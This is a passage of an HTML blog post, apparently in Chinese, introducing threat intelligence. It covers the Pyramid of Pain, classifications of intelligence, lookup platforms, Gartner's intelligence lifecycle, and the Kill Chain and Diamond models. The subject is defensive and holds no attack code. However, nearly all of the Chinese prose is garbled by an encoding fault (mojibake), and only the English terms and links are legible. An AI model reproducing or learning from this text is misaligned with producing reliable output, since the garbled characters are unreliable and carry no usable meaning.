alt="8be5978252a523fd61cee3ef211d70d2"><br><strong>è¿™ä¸ªé‡‘å­—å¡”éå¸¸æ˜æ˜¾çš„å±•ç¤ºäº†å…³äºæƒ…æŠ¥å’Œåˆ©ç”¨çš„å›°éš¾åº¦å¯¹åº”çš„å…³ç³»ï¼ŒåŒæ—¶ä¹Ÿå’Œæƒ…æŠ¥çš„ä»·å€¼ç›¸å…³</strong></p><p>ä»ä¸‹å¾€ä¸Šçœ‹ï¼š<br><strong>Hash Value</strong>ï¼šHashå€¼æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„å”¯ä¸€å‡­è¯ï¼Œç±»ä¼¼äºæˆ‘ä»¬åœ¨<code>VirusTotal</code>ä¸­æäº¤æ ·æœ¬é‚£ä¸²hashï¼Œä½†æ˜¯å¦‚æœæ–‡ä»¶ä¸­æœ‰ä¸€ç‚¹ä¸œè¥¿è¢«æ”¹å˜äº†ï¼Œéƒ½ä¼šå¯¼è‡´è¿™ä¸ªæ–‡ä»¶çš„Hashå€¼å˜å¾—ä¸åŒï¼Œæ‰€ä»¥åè€Œï¼Œä¸€ä¸ªæ ·æœ¬çš„hashä¹Ÿæ˜¯æœ€ä¸å€¼å¾—è·Ÿè¸ªçš„ï¼Œå½“ç„¶ä»·å€¼ä¹Ÿæœ€ä½ã€‚</p><p><strong>Ip Addresses</strong>ï¼šIPåœ°å€ï¼Œå¦‚æœæ”»å‡»è€…å¸¸ç”¨çš„<code>Pentest Server</code>è¢«è®°å½•ä¸‹æ¥çš„è¯ï¼Œä¹Ÿæœ‰ä¸€å®šçš„ä»·å€¼ï¼Œä¸è¿‡ç›®å‰æ¥è¯´ï¼Œç»å¤§éƒ¨åˆ†äººä½¿ç”¨C2åŸŸåæ¥éšè—è‡ªå·±çš„æ”»å‡»ï¼ŒåŒæ—¶ä½¿ç”¨CDN/ä»£ç†ä¹‹ç±»çš„æ‰‹æ®µçš„æ¥ä¸åœçš„å˜æ¢è‡ªå·±çš„IPï¼Œæ¥ç»•è¿‡è·Ÿè¸ªã€‚</p><p><strong>Domain Names</strong>ï¼šåŸŸåçš„è¯æ˜¯ç°åœ¨å¤§å¤šæ•°éšè”½æ”»å‡»çš„æ–¹å¼ï¼Œæ³¨å†Œä¸€ä¸ªç±»ä¼¼åŸŸåï¼Œé…åˆä½¿ç”¨é±¼å‰æ”»å‡»çš„å·¥å…·å¯ä»¥è¾¾åˆ°é‚®ä»¶é’“é±¼ä¹‹ç±»çš„ç›®çš„ã€‚åŸŸåçš„è¯éœ€è¦æ³¨å†Œï¼Œå¤‡æ¡ˆï¼Œç„¶åä¸æœåŠ¡å™¨è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥å‡†å¤‡çš„ä¸œè¥¿è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼éšè”½æ”»å‡»çš„æ•ˆæœä¹Ÿè¾ƒå¥½ï¼Œç‰¹åˆ«æ˜¯å¦‚æœå­˜åœ¨<code>Subdomain Takeover</code>è¿™æ ·çš„æ¼æ´ï¼Œæ•ˆæœéå¸¸çš„æ£’ã€‚ä½†æ˜¯åœ¨å¤§å‹APTè¡ŒåŠ¨ä¸­ï¼Œæ”»å‡»è€…ä¹Ÿä¼šå‡†å¤‡å¤§é‡åŸŸåï¼Œæ‰€ä»¥è¿™ä¸ªçš„ä»·å€¼å°±æ˜¾å¾—ä¸æ˜¯ç‰¹åˆ«çš„é«˜äº†ã€‚</p><p><a href="https://www.secpulse.com/archives/94973.html" target="_blank" rel="noopener">æ·±å…¥è§£æå­åŸŸåæ¥ç®¡ï¼ˆSubdomain Takeoverï¼‰æ¼æ´</a></p><p><strong>Network/Host Artifacts</strong>ï¼šé¡¾åæ€ä¹‰ï¼Œè¿™ä¸€å±‚æ˜¯ç½‘ç»œä¸ä¸»æœºç‰¹å¾ï¼Œè¿™é‡Œç‰¹å¾å¹¶ä¸å•å•åŒ…æ‹¬æ”»å‡»è€…çš„å„ç§ä¸»æœºä¿¡æ¯ï¼Œä¾‹å¦‚è®¿é—®çš„ç‰¹å®šUAå¤´ç­‰ï¼Œè¿˜åŒ…æ‹¬äº†æ”»å‡»è€…æ‰€è·å¾—çš„è´¦å·å¯†ç ï¼Œä¾‹å¦‚ä»æŸä¸€ä¸ªVPNè´¦å·è¿æ¥è‡³å†…ç½‘ï¼Œç„¶ååˆä»æŸä¸€å°å‡ºå£æœºå™¨èµ°å‡ºçš„æµé‡ç­‰ã€‚</p><p><strong>Tools</strong>ï¼šç‰¹å®šç»„ç»‡/å•ç‹¬çš„é»‘å®¢é€šå¸¸ä¼šä½¿ç”¨ç›¸åŒæˆ–ç›¸ä¼¼çš„æ–¹æ³•è¿›è¡Œæ”»å‡»ï¼Œè·å¾—äº†ä½¿ç”¨çš„å·¥å…·ç‰¹å¾ï¼Œå°±èƒ½è¿›è¡Œé’ˆå¯¹æ€§çš„å…æ€ç­‰ï¼Œè®©æ”»å‡»è€…å¢åŠ æˆæœ¬<br><strong>TTPs</strong>ï¼š<code>Tacticsã€Techniques &amp; Procedures</code>ï¼ŒTTPsåœ¨æ”»å‡»æ–¹ä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼ŒæŒ‡æ‰€ä½¿ç”¨çš„æ”»å‡»ç­–ç•¥ã€æ‰‹æ³•ç­‰ï¼Œäº†è§£äº†ä¸€ä¸ªç»„ç»‡çš„TTPsï¼Œå°±èƒ½æ˜ç™½æ”»å‡»è€…æ‰€åˆ©ç”¨çš„å…·ä½“æ¼æ´ï¼Œç„¶åå»é˜²å¾¡ã€‚</p><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p>è¿™é‡Œæ¨ä¸€æ³¢<code>@e1knot</code>å¸ˆå‚…åœ¨Defcon Groupä¸Šçš„æ¼”è®²PPT</p><p>ğŸ‘‰ <a href="https://www.slideshare.net/JeremyLi10/discover-advanced-threats-with-threat-intelligence-jeremy-li" target="_blank" rel="noopener">https://www.slideshare.net/JeremyLi10/discover-advanced-threats-with-threat-intelligence-jeremy-li</a></p><p>ä¼ ç»Ÿåˆ†ç±»æ¥çœ‹ï¼Œå¨èƒæƒ…æŠ¥åˆ†ä¸ºï¼š</p><ol><li>æˆ˜æœ¯æƒ…æŠ¥</li><li>æˆ˜ç•¥æƒ…æŠ¥</li><li>è¿è¥æƒ…æŠ¥</li></ol><p><strong>æˆ˜æœ¯çº§æƒ…æŠ¥</strong>ï¼šæˆ˜æœ¯æƒ…æŠ¥çš„ä½œç”¨ä¸»è¦æ˜¯å‘ç°å¨èƒäº‹ä»¶ä»¥åŠå¯¹æŠ¥è­¦ç¡®è®¤æˆ–ä¼˜å…ˆçº§æ’åºã€‚å¸¸è§çš„å¤±é™·æ£€æµ‹æƒ…æŠ¥ï¼ˆCnC æƒ…æŠ¥ï¼Œå³æ”»å‡»è€…æ§åˆ¶è¢«å®³ä¸»æœºæ‰€ä½¿ç”¨çš„è¿œç¨‹å‘½ä»¤ä¸æ§åˆ¶æœåŠ¡å™¨æƒ…æŠ¥ï¼‰ã€IPæƒ…æŠ¥å°±å±äºè¿™ä¸ªèŒƒç•´ï¼Œå®ƒä»¬éƒ½æ˜¯å¯æœºè¯»çš„æƒ…æŠ¥ï¼Œå¯ä»¥ç›´æ¥è¢«è®¾å¤‡ä½¿ç”¨ï¼Œè‡ªåŠ¨åŒ–çš„å®Œæˆä¸Šè¿°çš„å®‰å…¨å·¥ä½œã€‚</p><p><strong>è¿è¥çº§æƒ…æŠ¥</strong>ï¼šè¿è¥çº§æƒ…æŠ¥æ˜¯ç»™å®‰å…¨åˆ†æå¸ˆæˆ–è€…è¯´å®‰å…¨äº‹ä»¶å“åº”äººå‘˜ä½¿ç”¨çš„ï¼Œç›®çš„æ˜¯å¯¹å·²çŸ¥çš„é‡è¦å®‰å…¨äº‹ä»¶åšåˆ†æï¼ˆæŠ¥è­¦ç¡®è®¤ã€æ”»å‡»å½±å“èŒƒå›´ã€æ”»å‡»é“¾ä»¥åŠæ”»å‡»ç›®çš„ã€æŠ€æˆ˜æœ¯æ–¹æ³•ç­‰ï¼‰æˆ–è€…åˆ©ç”¨å·²çŸ¥çš„æ”»å‡»è€…æŠ€æˆ˜æœ¯æ‰‹æ³•ä¸»åŠ¨çš„æŸ¥æ‰¾æ”»å‡»ç›¸å…³çº¿ç´¢ã€‚</p><p><strong>æˆ˜ç•¥çº§æƒ…æŠ¥</strong>ï¼šæˆ˜ç•¥å±‚é¢çš„å¨èƒæƒ…æŠ¥æ˜¯ç»™ç»„ç»‡çš„å®‰å…¨ç®¡ç†è€…ä½¿ç”¨çš„ï¼Œæ¯”å¦‚CSOã€‚å®ƒèƒ½å¤Ÿå¸®åŠ©å†³ç­–è€…æŠŠæ¡å½“å‰çš„å®‰å…¨æ€åŠ¿ï¼Œåœ¨å®‰å…¨å†³ç­–ä¸Šæ›´åŠ æœ‰ç†æœ‰æ®ã€‚åŒ…æ‹¬äº†ä»€ä¹ˆæ ·çš„ç»„ç»‡ä¼šè¿›è¡Œæ”»å‡»ï¼Œæ”»å‡»å¯èƒ½é€ æˆçš„å±å®³æœ‰å“ªäº›ï¼Œæ”»å‡»è€…çš„æˆ˜æœ¯èƒ½åŠ›å’ŒæŒæ§çš„èµ„æºæƒ…å†µç­‰ï¼Œå½“ç„¶ä¹Ÿä¼šåŒ…æ‹¬å…·ä½“çš„æ”»å‡»å®ä¾‹ã€‚</p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”-æ‰‹åŠ¨åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“</p><p>ç„¶å<code>@e1knot</code>å¸ˆå‚…åœ¨çŸ¥ä¹ä¸“æ ä¸­æåˆ°äº†å¦ä¸€ç§åˆ†ç±»æ–¹å¼ï¼Œåœ¨æˆ‘çœ‹æ¥è¿™ç§ä¹Ÿæ˜¯æ›´åŠ å®¹æ˜“ç†è§£çš„ï¼ˆèµï¼‰</p><p>ğŸ‘‰ <a href="https://zhuanlan.zhihu.com/p/30105006" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30105006</a></p><p>å¤§æ¦‚å°±æ˜¯åˆ†ä¸ºå¦‚ä¸‹å‡ ç§ç±»å‹ï¼š</p><ol><li>IP/Domain ä¿¡èª‰ç±»æƒ…æŠ¥</li><li>ç½‘ç»œé€šä¿¡æµé‡æ•°æ®</li><li>äº‹ä»¶åˆ†ç±»ï¼ˆIncident Pulseï¼‰æ•°æ®</li><li>èœœç½æ•°æ®</li><li>è¢«åŠ¨æµé‡è§£æï¼ˆPassive DNSï¼‰æ•°æ®</li></ol><p>ï¼ˆç›¸ä¿¡å„ä½æ¸—é€æµ‹è¯•å·¥ä½œè€…ä¹Ÿå¸¸å¸¸åœ¨å®æˆ˜ä¸­é‡åˆ°èœœç½è¿™ç±»ä¸œè¥¿ï¼Œç¨ä¸æ³¨æ„å°±ä¼šæŠŠè‡ªå·±å¸¸ç”¨çš„å§¿åŠ¿å’Œæ‰‹æ®µâ€œé€â€ç»™ä¼ä¸šï¼‰</p><p><strong>IP/Domain ä¿¡èª‰ç±»æƒ…æŠ¥</strong>ï¼šç»å¸¸é€›å¾®æ­¥ç¤¾åŒºæˆ–è€…ç”¨å®ƒæ¥æ‰¾è¿‡dnsè§£æä¹‹ç±»çš„å¸ˆå‚…è‚¯å®šä¹Ÿä¼šå‘ç°ï¼ŒIPæˆ–è€…åŸŸåä¼šè¢«æ‰“ä¸Šå„ç§æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š<br><img src="/åˆè¯†å¨èƒæƒ…æŠ¥.resources/D934469E-34B5-428B-9F83-FB61673159EA.png" alt="34f6416ad8558f4cf07372f9484726b6"></p><p>ä»¥ä¸‹å¹³å°å¯ä»¥ä¾›æˆ‘ä»¬æ–¹ä¾¿çš„æŸ¥è¯¢åˆ°è¿™ä¸ªIP/Domainiæ˜¯ä¸æ˜¯å·²ç»è¢«åˆ—ä¸ºæ¶æ„IP/Domainï¼Œæˆ–è€…ä»–åœ¨æŸä¸€æ®µæ—¶é—´æ˜¯å¦æ˜¯è¢«æ¶æ„æ”»å‡»è€…æ”»é™·ç­‰ã€‚</p><ul><li>å¾®æ­¥åœ¨çº¿ - <a href="https://x.threatbook.cn" target="_blank" rel="noopener">https://x.threatbook.cn</a></li><li>å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ - <a href="https://ti.qianxin.com/" target="_blank" rel="noopener">https://ti.qianxin.com/</a></li><li>RiskIQ Community - <a href="https://community.riskiq.com" target="_blank" rel="noopener">https://community.riskiq.com</a></li></ul><p>ä½†æ˜¯ç”±äºä¸åŒçš„å¨èƒå¹³å°çš„æ£€æµ‹å¯èƒ½ä¸åŒï¼Œå¯¼è‡´ç»“æœå¯èƒ½æœ‰åå·®ç­‰ã€‚æ‰€ä»¥ç›¸å¯¹å…¶ä»–çš„ï¼Œåè€Œæˆä¸ºäº†ç›¸å¯¹æœ€æ²¡æœ‰ä»·å€¼çš„æƒ…æŠ¥</p><p><strong>ç½‘ç»œé€šä¿¡æµé‡æ•°æ®</strong>ï¼šè¿™é‡ŒæŒ‡ä»å¤§ç½‘ä¸Šé‡‡é›†çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¿—ç§°çš„å¤–ç½‘æ•°æ®ã€‚ä¸»è¦æ˜¯çœ‹ç›®æ ‡æœåŠ¡å™¨çš„æµé‡æ³¢åŠ¨ï¼Œæ¯”å¦‚å¦‚æœåœ¨æŸä¸€ä¸ªç«¯å£ä¸Šçš„æµé‡åœ¨ä¸€æ®µæ—¶é—´å‰§å¢ï¼Œå¯èƒ½å­˜åœ¨è¢«å…¥ä¾µçš„é£é™©</p><p><strong>äº‹ä»¶åˆ†ç±»</strong>ï¼šè¿™é‡Œæä¸€ä¸‹ä¸¤ä¸ªæ¦‚å¿µï¼š</p><ol><li>CERTï¼šComputer emergency response team  ç»´åŸºç™¾ç§‘ï¼š<a href="https://en.wikipedia.org/wiki/Computer_emergency_response_team" target="_blank" rel="noopener">wiki</a></li><li>CIRTï¼šCritical Incident Response Team ç»´åŸºç™¾ç§‘ï¼š<a href="https://en.wikipedia.org/wiki/Critical_Incident_Response_Team" target="_blank" rel="noopener">wiki</a></li></ol><p>å…·ä½“å¯ä»¥æŸ¥çœ‹åé¢çš„ç»´åŸºç™¾ç§‘é“¾æ¥è¿›è¡Œäº†è§£<br>ç„¶åæ˜¯äº‹ä»¶åˆ†ç±»å¤§æ¦‚å°±æ˜¯ï¼Œå°†å¨èƒæƒ…æŠ¥çš„åŸºç¡€æ•°æ®è¿›è¡Œæ‰“åŒ…åˆ†ç±»ï¼Œç„¶åå°è£…æˆä¸€ä¸ªä¸ªçš„äº‹ä»¶ã€‚<br>è¿™ç§æƒ…æŠ¥çš„å¥½å¤„åœ¨å“ªé‡Œå‘¢ï¼Œä¸€ä¸ªæ˜¯å¯ä»¥åŸºæœ¬å…¨é¢çš„è¿›è¡Œå¨èƒåˆ†æï¼Œç„¶åæå‰é¢„è­¦ã€‚ç„¶ååŒæ—¶ä¹Ÿå¯ä»¥æ›´å¿«çš„å‘ç°äº‹ä»¶ã€‚<br>ç„¶åå‚å•†ç»è¿‡æ•´ç†åï¼Œå¯ä»¥é€šè¿‡è®¢é˜…çš„æ–¹å¼è¿›è¡Œé¢„è­¦ï¼ŒåŒæ—¶æ”¶å–è®¢é˜…è´¹ç”¨ã€‚<br>ä¾‹å¦‚ï¼š</p><ul><li>å¾®æ­¥åœ¨çº¿</li><li>Alienvault OTX <a href="https://otx.alienvault.com" target="_blank" rel="noopener">https://otx.alienvault.com</a></li><li>IBM X-Force Exchange <a href="https://exchange.xforce.ibmcloud.com/" target="_blank" rel="noopener">https://exchange.xforce.ibmcloud.com/</a></li></ul><p><strong>èœœç½æ•°æ®</strong>ï¼šè¿™ä¸ªä¸œè¥¿æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯ä¼ä¸šéƒ¨ç½²åœ¨å†…ç½‘æˆ–è€…å¤–ç½‘ï¼ˆå¾ˆå°‘ï¼‰çš„ä¸€äº›çœ‹ä¼¼è–„å¼±ç‚¹ï¼Œå¼•è¯±æ”»å‡»è€…è¿›è¡Œæ”»å‡»ï¼Œæš´éœ²è‡ªå·±çš„è¡Œä¸ºç‰¹å¾ç”šè‡³æ˜¯TTP</p><p>ç„¶åæœ€è¿‘å†°æ€»ç¤¾åŒºé‡Œå‘äº†ä¸ªæŒºå¥½ç©çš„å¼€æºèœœç½ï¼š<br>ğŸ‘‰ <a href="https://bithack.io/forum/484" target="_blank" rel="noopener">https://bithack.io/forum/484</a></p><p><strong>è¢«åŠ¨æµé‡è§£æ</strong>ï¼šå…¶å®å°±æ˜¯è¢«åŠ¨DNSï¼ˆPassive DNSï¼‰ï¼Œä¹Ÿæ˜¯ä¸€ç§æ¯”è¾ƒè€çš„æŠ€æœ¯äº†ï¼Œä½†æ˜¯ä¾ç„¶å¾ˆå¸¸ç”¨ï¼Œç‰¹åˆ«æ˜¯æº¯æºå†…ç½‘æ¶æ„æµé‡çš„æ—¶å€™..ä¸‹é¢è¿™å‡ ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†äº†ï½å°±ä¸å¤šè®²äº†</p><ul><li><a href="https://securityintelligence.com/how-to-use-passive-dns-to-inform-your-incident-response/" target="_blank" rel="noopener">How to Use Passive DNS to Inform Your Incident Response</a></li><li><p><a href="https://www.deteque.com/news/passive-dns/" target="_blank" rel="noopener">What is Passive DNS? A beginnerâ€™s guide</a></p></li><li><p><a href="https://www.riskiq.com/platform/architecture/internet-data-sets/passive-dns/" target="_blank" rel="noopener">Passive DNS</a></p></li></ul><h3 id="ç”Ÿå‘½å‘¨æœŸ"><a href="#ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="ç”Ÿå‘½å‘¨æœŸ"></a>ç”Ÿå‘½å‘¨æœŸ</h3><blockquote><p>ã€ŠMarket Guide for Security Threat Intelligence Serviceã€‹ â€“ Gartner . 2014</p></blockquote><p>åœ¨ä¸šç•Œæ¥å—è¾ƒå¹¿ï¼Œè€Œä»–è®¤ä¸ºæƒ…æŠ¥æ˜¯è¿‡ç¨‹çš„äº§ç‰©ï¼Œè€Œéç‹¬ç«‹æ•°æ®ç‚¹çš„åˆé›†ã€‚Gartneråˆ»ç”»äº†å¨èƒæƒ…æŠ¥çš„ç”Ÿå‘½å‘¨æœŸï¼š<br><img src="/åˆè¯†å¨èƒæƒ…æŠ¥.resources/A574A6F6-0408-4F70-90D0-5E43D1CA3147.png" alt="b551bc79146cfd117fd9ccf5b4c04408.png"></p><ul><li>å®šå‘ï¼šå®šä¹‰ç›®æ ‡å¹¶å®Œå–„</li><li>æ”¶é›†ï¼šä»å¤šç§å¼€æ”¾æˆ–å°é—­çš„æºæ”¶é›†æ•°æ®ï¼›ç”µå­çš„ã€äººå·¥çš„</li><li>å¤„ç†ï¼šå¦‚æœ‰éœ€è¦ï¼Œç¿»è¯‘ï¼›è¿›è¡Œå¯é æ€§è¯„ä¼°ï¼›æ ¸å¯¹å¤šä¸ªæº</li><li>åˆ†æï¼šåˆ¤æ–­æ­¤ä¿¡æ¯çš„æ„ä¹‰ï¼›è¯„ä¼°ä¿¡æ¯çš„é‡è¦æ€§ï¼›æ¨èç›¸åº”æªæ–½</li><li>ä¼ é€’ï¼šå°†æƒ…æŠ¥ä¼ é€’ç»™å®¢æˆ·</li><li>åé¦ˆï¼šä¾ç…§éœ€æ±‚è°ƒæ•´</li></ul><h3 id="æ„ä¹‰"><a href="#æ„ä¹‰" class="headerlink" title="æ„ä¹‰"></a>æ„ä¹‰</h3><p>åŒæ ·ä¹Ÿæ˜¯<code>@e1knot</code>å¸ˆå‚…æ–‡ç« ä¸­æåˆ°çš„ï¼Œ<strong>å¨èƒæƒ…æŠ¥åœ¨å®‰å…¨è¿è¥ä½“ç³»ä¸­çš„å®šä½æ˜¯â€”â€”è¾…åŠ©å‘ç°æ½œåœ¨çš„æˆ–æ­£åœ¨å‘èµ·çš„æ¶æ„è¡Œä¸ºæˆ–æ“ä½œï¼Œé‡ç‚¹åœ¨äºè¾…åŠ©ä¸¤ä¸ªå­—ï¼Œå¨èƒæƒ…æŠ¥ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´åªèƒ½æœ‰é™çš„æ„ŸçŸ¥æ½œåœ¨çš„å¨èƒï¼Œæ¢å¥è¯è¯´ï¼šå¦‚æœæœ‰äººç°åœ¨ç„å‡†çš„ç›®æ ‡å…¨éƒ¨éƒ½æ˜¯èƒ½æºç±»å®¢æˆ·ï¼Œé‚£ä¹ˆå¨èƒæƒ…æŠ¥å°±å¯ä»¥æé†’æ²¡æœ‰è¢«æ”»å‡»çš„å®¢æˆ·å¯èƒ½ä¼šé­å—åˆ°è¯¥æ”»å‡»è€…çš„æ”»å‡»ï¼Œè¿™ä¸ªå«åšæœ‰é™çš„æ„ŸçŸ¥æ½œåœ¨çš„å¨èƒã€‚</strong></p><h2 id="0x02-åˆ†ææ¨¡å‹"><a href="#0x02-åˆ†ææ¨¡å‹" class="headerlink" title="0x02 åˆ†ææ¨¡å‹"></a>0x02 åˆ†ææ¨¡å‹</h2><p><a href="https://www.slideshare.net/JeremyLi10/application-of-threat-intelligence-in-security-operation?utm_source=slideview&amp;utm_medium=ssemail&amp;utm_campaign=first_clip" target="_blank" rel="noopener">https://www.slideshare.net/JeremyLi10/application-of-threat-intelligence-in-security-operation?utm_source=slideview&amp;utm_medium=ssemail&amp;utm_campaign=first_clip</a></p><p>æ—¢ç„¶å¨èƒæƒ…æŠ¥æ˜¯ä¸ªè¾…åŠ©æ‰‹æ®µï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬é€šè¿‡ä½¿ç”¨å¨èƒæƒ…æŠ¥è¿›è¡Œåˆ†æï¼Œæ‰æ˜¯æœ€ä¸»è¦çš„ã€‚<br>è¿™é‡Œç›®å‰ç”¨çš„æ¯”è¾ƒå¤šçš„å°±æ˜¯ä¸¤å¤§æ¨¡å‹ï¼š</p><ol><li>Kill Chain</li><li>Diamond Model</li></ol><p>ä½†æ˜¯æˆ‘è§‰å¾—ç°åœ¨åº”è¯¥å†åŠ ä¸€ä¸ªATT&amp;CKçŸ©é˜µï¼Œæ¯”å¦‚ä»¥æœ€å‡ºåçš„<code>MITRE ATT&amp;CK</code>ä¸¾ä¾‹ï¼Œé‡Œé¢åŸºæœ¬ä¸Šé›†åˆäº†ç»å¤§éƒ¨åˆ†çš„å…¥ä¾µæ¨¡å‹ã€‚<br>ğŸ‘‰ <a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&amp;CK</a></p><h3 id="Kill-Chainæ¨¡å‹"><a href="#Kill-Chainæ¨¡å‹" class="headerlink" title="Kill-Chainæ¨¡å‹"></a>Kill-Chainæ¨¡å‹</h3><p><img src="/åˆè¯†å¨èƒæƒ…æŠ¥.resources/0133F529-3989-4E8B-847C-F5A3F33C1FBE.jpg" alt="fcc8b4c5429f36b191520f4c40e4dcb1.jpeg"><br>è¿™ä¸ªæ¨¡å‹å…¶å®å’Œ<code>PTES</code>æ¯”è¾ƒç›¸ä¼¼ï¼Œåšæ¸—é€æ¯”è¾ƒå¤šçš„åŒå­¦åº”è¯¥éƒ½æ¯”è¾ƒäº†è§£äº†</p><ul><li>ä¾¦æŸ¥é˜¶æ®µï¼šæ‰«æç›®æ ‡ITèµ„äº§å’Œä¿¡æ¯æ”¶é›†ï¼Œæ¯”å¦‚è¯´Google Hackingè¿™äº›ä¾¦æŸ¥ç±»å‹çš„æ”»å‡»</li><li>æ­¦å™¨åŒ–é˜¶æ®µï¼šå°†å‰ä¸€é˜¶æ®µå‘ç°å’Œæ‰«æåˆ°æ¼æ´çš„ä¿¡æ¯æ•´åˆåˆ°ä¸€èµ·å¹¶åˆ¶ä½œé’ˆå¯¹æ€§çš„æ­¦å™¨ï¼ˆå½“ç„¶å›½å†…çš„å˜›ï¼Œä½ æ‡‚å¾—ï¼‰</li><li>éƒ¨ç½²é˜¶æ®µï¼šå°†è¿™äº›æ­¦å™¨æˆ–è€…æ˜¯è¿œæ§RATéƒ¨ç½²åˆ°å¯¹åº”çš„Compromised Serversä¸Š</li><li>æ”»å‡»é˜¶æ®µï¼šä½¿ç”¨è¿™äº›Compromised Serverså’Œä¹‹å‰åšå¥½çš„æ­¦å™¨åŒ–å·¥å…·å¯¹ç›®æ ‡å‘èµ·æ”»å‡»</li><li>åé—¨ç§æ¤é˜¶æ®µï¼šå®‰è£…è¿œç¨‹æ§åˆ¶çš„æœåŠ¡å’Œè¿›ç¨‹</li><li>è¿œæ§é˜¶æ®µï¼šè®©ç›®æ ‡å’ŒC&amp;Cé€šä¿¡</li><li>åæ¸—é€é˜¶æ®µï¼šæ”¶å‰²ã€ç»§ç»­æ¨ªå‘æ¸—é€å…¥ä¾µ</li></ul><p>è¿˜æ˜¯ç»™ä¸€ä¸ªé“¾æ¥ï¼š<a href="http://www.pentest-standard.org/index.php/Main_Page" target="_blank" rel="noopener">pentest-standard</a><br>PTESåŸºæœ¬æµç¨‹ï¼š</p><ul><li>Pre-engagement Interactions</li><li>Intelligence Gathering</li><li>Threat Modeling</li><li>Vulnerability Analysis</li><li>Exploitation</li><li>Post Exploitation</li><li>Reporting</li></ul><p><strong><code>Kill-Chainæ¨¡å‹</code>åŸºæœ¬ä¸Šå°±æ˜¯æè¿°äº†æ”»å‡»è€…çš„è¿›æ”»è·¯çº¿ï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ˜ç¡®çš„è¯´æ˜é€ æˆçš„å½±å“å’Œç›®çš„ã€‚</strong></p><h3 id="Diamond-Modelæ¨¡å‹"><a href="#Diamond-Modelæ¨¡å‹" class="headerlink" title="Diamond Modelæ¨¡å‹"></a>Diamond Modelæ¨¡å‹</h3><p>é’»çŸ³æ¨¡å‹æ˜¯ä¸€ä¸ªé’ˆå¯¹å•ä¸ªäº‹ä»¶åˆ†æçš„æ¨¡å‹ï¼Œæ ¸å¿ƒå°±æ˜¯ç”¨æ¥æè¿°æ”»å‡»è€…çš„æŠ€æˆ˜æœ¯å’Œç›®çš„ï¼Œå…·ä½“çš„é’»çŸ³æ¨¡å‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/åˆè¯†å¨èƒæƒ…æŠ¥.resources/11AEE56D-E38D-48D7-B02D-D09B38AEE471.jpg" alt="4b601b6bc348f226a906ce13b3d535d0.jpeg"></p><p>é’»çŸ³æ¨¡å‹ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šç½®ä¿¡åº¦ã€å…ƒæ•°æ®ã€ç¤¾ä¼š-æ”¿æ²»å½±å“å’ŒæŠ€æˆ˜æœ¯ç»„åˆ</p><p><strong>ç¤¾ä¼šæ”¿æ²»å½±å“</strong>ï¼šå¤„äºé’»çŸ³æ¨¡å‹ä¸Šä¸‹ä¸¤ä¸ªé¡¶ç‚¹ï¼Œä¸Šé¡¶ç‚¹è¡¨ç¤ºæ”»å‡»è€…ï¼Œä¸‹é¡¶ç‚¹è¡¨ç¤ºå—å®³è€…ä¹Ÿå°±æ˜¯ç›®æ ‡ã€‚æ”»å‡»è€…å’Œå—å®³è€…ä¹‹é—´çš„æŸç§åˆ©ç›Šå†²çªæˆ–è€…æ˜¯ç¤¾ä¼šåœ°ä½å¯¹ç«‹åˆ™ä¼šäº§ç”Ÿæ”»å‡»çš„æ„å›¾å’Œå‘èµ·æ”»å‡»çš„åŸå› ï¼Œçºµåˆ‡é¢è¡¨ç¤ºçš„å°±æ˜¯ç¤¾ä¼šæ”¿æ²»å½±å“ã€‚è¯´å¤§ç™½è¯å°±æ˜¯æ ¹æ®è¿™ä¿©äººå»å‘ç°æ”»å‡»çš„æ„å›¾ã€‚</p><p><strong>æŠ€æˆ˜æœ¯ç»„åˆ</strong>ï¼šæŠ€æˆ˜æœ¯ç»„åˆä½äºæ•´ä¸ªé’»çŸ³æ¨¡å‹çš„æ¨ªåˆ‡é¢ï¼Œæ¨ªåˆ‡é¢çš„ä¸¤ä¸ªé¡¶ç‚¹åˆ†åˆ«ä¸ºåŸºç¡€è®¾æ–½å’ŒæŠ€æœ¯èƒ½åŠ›ï¼Œè¿™é‡Œçš„åŸºç¡€è®¾æ–½å’ŒæŠ€æœ¯èƒ½åŠ›å…¶å®éƒ½æ˜¯ç›¸å¯¹äºæ”»å‡»è€…è€Œè¨€çš„ã€‚</p><p><strong>å…ƒæ•°æ®</strong>ï¼šè¿™ä¸ªå…¶å®å°±æ˜¯å·¦è¾¹åˆ—å‡ºæ¥çš„ï¼Œæ”»å‡»æ—¶é—´ã€æ”»å‡»é˜¶æ®µã€æ”»å‡»ç»“æœã€æ”»å‡»æ–¹å‘ã€æ”»å‡»æ‰‹æ®µã€æ”»å‡»èµ„æºåˆ©ç”¨ã€‚</p><p><strong>ç½®ä¿¡åº¦</strong>ï¼šä¹Ÿå°±æ˜¯ä»¥ä¸Šä½ åˆ†æå‡ºç»“æœçš„å¯ä¿¡ç¨‹åº¦ã€‚</p><p>é’»çŸ³æ¨¡å‹æƒ³è¦è¡¨è¾¾çš„å…¶å®å°±æ˜¯é’ˆå¯¹å•ä¸ªå®‰å…¨äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ”»å‡»è€…ä¸ºä»€ä¹ˆæƒ³è¦æ”»å‡»ç›®æ ‡ï¼Œæ‰“ç®—ç”¨ä»€ä¹ˆæ‰‹æ®µå»æ”»å‡»ç›®æ 